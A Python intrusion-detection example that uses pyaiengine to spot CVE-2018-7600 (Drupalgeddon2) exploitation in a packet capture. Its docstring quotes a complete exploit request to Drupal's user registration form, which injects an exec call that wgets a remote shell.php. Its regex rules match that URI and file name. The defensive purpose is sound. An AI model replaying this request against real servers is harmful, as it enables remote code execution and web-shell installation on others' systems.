#!/usr/bin/env python
# Example for detect  CVE-2018-7600
import sys
import pyaiengine

"""
    Here is the request that generates the issue CVE-2018-7600

    POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
    Host: 192.168.235.100
    Connection: keep-alive
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: python-requests/2.18.4
    Content-Length: 210
    Content-Type: application/x-www-form-urlencoded

    mail%5B%23markup%5D=wget+https%3A%2F%2Fraw.githubusercontent.com%2Fa2u%2FCVE-2018-7600%2Fmaster%2Fshell.php&mail%5B%23type%5D=markup&form_id=user_register_form&_drupal_ajax=1&mail%5B%23post_render%5D%5B%5D=exec           

"""

def uri_callback(flow):

    print("\033[93m" + "WARNING: Possible CVE-2018-7600 Attack detected on %s" % str(flow) + "\033[0m")

def payload_callback(flow):

    print("\033[31m" + "ALERT: CVE-2018-7600 Attack detected on %s" % str(flow) + "\033[0m")

if __name__ == '__main__':

    st = pyaiengine.StackLan()

    dm = pyaiengine.DomainNameManager()
    rm1 = pyaiengine.RegexManager()
    rm2 = pyaiengine.RegexManager()
    r1 = pyaiengine.Regex("Potential bad drupal", b"^/user/register", uri_callback)
    r2 = pyaiengine.Regex("Bad drupal", "shell.php", payload_callback)
    d = pyaiengine.DomainName("All HTTP traffic", "*")

    d.http_uri_regex_manager = rm1

    rm2.add_regex(r2)

    r1.next_regex_manager = rm2

    rm1.add_regex(r1)
    dm.add_domain_name(d)

    st.set_domain_name_manager(dm, "HTTPProtocol")

    st.set_dynamic_allocated_memory(True)

    source = "Drupal2_exploitation.pcap"

    with pyaiengine.PacketDispatcher(source) as pd:
        pd.stack = st
        pd.run()

    sys.exit(0)

